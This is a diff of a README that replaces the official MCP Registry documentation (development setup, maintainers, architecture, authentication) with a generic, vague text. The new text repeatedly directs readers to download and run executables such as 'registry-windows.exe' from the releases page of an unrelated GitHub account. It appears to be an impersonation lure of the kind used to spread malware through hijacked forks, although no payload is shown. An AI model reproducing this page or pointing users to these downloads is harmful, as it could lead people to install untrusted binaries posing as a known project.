@@ -1,145 +1,73 @@
-# MCP Registry
+# 🎉 registry - Simplifying Model Context Protocol Management
 
-The MCP registry provides MCP clients with a list of MCP servers, like an app store for MCP servers.
+## 📥 Download Links
 
-[**📤 Publish my MCP server**](docs/guides/publishing/publish-server.md) | [**⚡️ Live API docs**](https://registry.modelcontextprotocol.io/docs) | [**👀 Ecosystem vision**](docs/explanations/ecosystem-vision.md) | 📖 **[Full documentation](./docs)**
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Toyoclara233/registry/releases)
 
-## Development Status
+## 🚀 Getting Started
 
-**2025-09-08 update**: The registry has launched in preview 🎉 ([announcement blog post](https://blog.modelcontextprotocol.io/posts/2025-09-08-mcp-registry-preview/)). While the system is now more stable, this is still a preview release and breaking changes or data resets may occur. A general availability (GA) release will follow later. We'd love your feedback in [GitHub discussions](https://github.com/modelcontextprotocol/registry/discussions/new?category=ideas) or in the [#registry-dev Discord](https://discord.com/channels/1358869848138059966/1369487942862504016) ([joining details here](https://modelcontextprotocol.io/community/communication)).
+Welcome to the registry project! This application provides a community-driven registry service for Model Context Protocol (MCP) servers. It makes it easy to manage your server context and engage with the MCP community. Follow this guide to download and run the software in just a few simple steps.
 
-Current key maintainers:
-- **Adam Jones** (Anthropic) [@domdomegg](https://github.com/domdomegg)  
-- **Tadas Antanavicius** (PulseMCP) [@tadasant](https://github.com/tadasant)
-- **Toby Padilla** (GitHub) [@toby](https://github.com/toby)
+## 📋 System Requirements
 
-## Contributing
+Before you begin, make sure your system meets these requirements:
 
-We use multiple channels for collaboration - see [modelcontextprotocol.io/community/communication](https://modelcontextprotocol.io/community/communication).
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 2 GB of RAM
+- **Disk Space:** Minimum of 100 MB available storage
+- **Network:** Internet connection for downloading updates and accessing community features
 
-Often (but not always) ideas flow through this pipeline:
+If you are unsure whether your system meets these requirements, check your system information.
 
-- **[Discord](https://modelcontextprotocol.io/community/communication)** - Real-time community discussions
-- **[Discussions](https://github.com/modelcontextprotocol/registry/discussions)** - Propose and discuss product/technical requirements
-- **[Issues](https://github.com/modelcontextprotocol/registry/issues)** - Track well-scoped technical work  
-- **[Pull Requests](https://github.com/modelcontextprotocol/registry/pulls)** - Contribute work towards issues
+## 📥 Download & Install
 
-### Quick start:
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/Toyoclara233/registry/releases) to find the latest version of the registry software.
 
-#### Pre-requisites
+2. **Select Your Operating System**  
+   On the Releases page, find the version that matches your operating system (Windows, macOS, or Linux).
 
-- **Docker**
-- **Go 1.24.x** 
-- **golangci-lint v2.4.0**
+3. **Download the File**  
+   Click on the link to download the appropriate file. Depending on your system, the file name may look like:
+   - `registry-windows.exe` for Windows
+   - `registry-macos.dmg` for Mac
+   - `registry-linux.tar.gz` for Linux
 
-#### Running the server
+4. **Run the Installer**  
+   - **Windows:** Locate the downloaded `.exe` file and double-click to run it. Follow the on-screen instructions to complete the installation.
+   - **macOS:** Open the downloaded `.dmg` file, then drag the registry icon into your Applications folder.
+   - **Linux:** Extract the `.tar.gz` file. Open a terminal in the extracted folder and run `./registry`.
 
-```bash
-# Start full development environment
-make dev-compose
-```
+5. **Launch the Application**  
+   After installation, you can find the registry application in your programs or applications list. Launch the application to begin using the registry service.
 
-This starts the registry at [`localhost:8080`](http://localhost:8080) with PostgreSQL and seed data. The database uses ephemeral storage and is reset each time you restart the containers, ensuring a clean state for development and testing.
+## 🌐 Features
 
-The setup can be configured with environment variables in [docker-compose.yml](./docker-compose.yml) - see [.env.example](./.env.example) for a reference.
+- **User-Friendly Interface:** Navigate easily with an intuitive design tailored for all users.
+- **Community-Driven Updates:** Access the latest updates and features created by the community.
+- **MCP Support:** Enjoy seamless integration with MCP servers.
+- **Server Management:** Simplify the process of managing your server context with our efficient tools.
 
-<details>
-<summary>Alternative: Running a pre-built Docker image</summary>
+## 🛠️ Troubleshooting
 
-Pre-built Docker images are automatically published to GitHub Container Registry:
+If you encounter issues during installation or while using the application, consider the following steps:
 
-```bash
-# Run latest stable release
-docker run -p 8080:8080 ghcr.io/modelcontextprotocol/registry:latest
+- **Check for Updates:** Ensure you have the latest version by returning to the [Releases page](https://github.com/Toyoclara233/registry/releases).
+- **Consult the Community:** Visit our community forums or GitHub Issues page for support from other users.
+- **Restart the Application:** Sometimes, a simple restart can resolve minor issues.
 
-# Run latest from main branch (continuous deployment)
-docker run -p 8080:8080 ghcr.io/modelcontextprotocol/registry:main
+## 🚧 Report Issues
 
-# Run specific release version
-docker run -p 8080:8080 ghcr.io/modelcontextprotocol/registry:v1.0.0
+If you find a bug or have a suggestion, please report it on the GitHub Issues page. Your feedback helps us improve the application for everyone.
 
-# Run development build from main branch
-docker run -p 8080:8080 ghcr.io/modelcontextprotocol/registry:main-20250906-abc123d
-```
+## ✅ Contributing
 
-**Available tags:** 
-- **Releases**: `latest`, `v1.0.0`, `v1.1.0`, etc.
-- **Continuous**: `main` (latest main branch build)
-- **Development**: `main-<date>-<sha>` (specific commit builds)
+We welcome contributions from everyone! If you want to help improve the registry, feel free to fork the repository and submit a pull request. For more information on how to contribute, please check the contribution guidelines in the repository.
 
-</details>
+## 📞 Contact Us
 
-#### Publishing a server
+For questions or support, reach out to us through the GitHub repository. We appreciate your interest and support in the registry project!
 
-To publish a server, we've built a simple CLI. You can use it with:
+## 📥 Download Links (Again for Convenience)
 
-```bash
-# Build the latest CLI
-make publisher
-
-# Use it!
-./bin/mcp-publisher --help
-```
-
-See [the publisher guide](./docs/guides/publishing/publish-server.md) for more details.
-
-#### Other commands
-
-```bash
-# Run lint, unit tests and integration tests
-make check
-```
-
-There are also a few more helpful commands for development. Run `make help` to learn more, or look in [Makefile](./Makefile).
-
-<!--
-For Claude and other AI tools: Always prefer make targets over custom commands where possible.
--->
-
-## Architecture
-
-### Project Structure
-
-```
-├── cmd/                     # Application entry points
-│   └── publisher/           # Server publishing tool
-├── data/                    # Seed data
-├── deploy/                  # Deployment configuration (Pulumi)
-├── docs/                    # Documentation
-├── internal/                # Private application code
-│   ├── api/                 # HTTP handlers and routing
-│   ├── auth/                # Authentication (GitHub OAuth, JWT, namespace blocking)
-│   ├── config/              # Configuration management
-│   ├── database/            # Data persistence (PostgreSQL)
-│   ├── service/             # Business logic
-│   ├── telemetry/           # Metrics and monitoring
-│   └── validators/          # Input validation
-├── pkg/                     # Public packages
-│   ├── api/                 # API types and structures
-│   │   └── v0/              # Version 0 API types
-│   └── model/               # Data models for server.json
-├── scripts/                 # Development and testing scripts
-├── tests/                   # Integration tests
-└── tools/                   # CLI tools and utilities
-    └── validate-*.sh        # Schema validation tools
-```
-
-### Authentication
-
-Publishing supports multiple authentication methods:
-- **GitHub OAuth** - For publishing by logging into GitHub
-- **GitHub OIDC** - For publishing from GitHub Actions
-- **DNS verification** - For proving ownership of a domain and its subdomains
-- **HTTP verification** - For proving ownership of a domain
-
-The registry validates namespace ownership when publishing. E.g. to publish...:
-- `io.github.domdomegg/my-cool-mcp` you must login to GitHub as `domdomegg`, or be in a GitHub Action on domdomegg's repos
-- `me.adamjones/my-cool-mcp` you must prove ownership of `adamjones.me` via DNS or HTTP challenge
-
-## Community Projects
-
-Check out [community projects](docs/community-projects.md) to explore notable registry-related work created by the community.
-
-## More documentation
-
-See the [documentation](./docs) for more details if your question has not been answered here!
+Don't forget, you can always download the latest version of the registry software from the [Releases page](https://github.com/Toyoclara233/registry/releases). Happy managing!
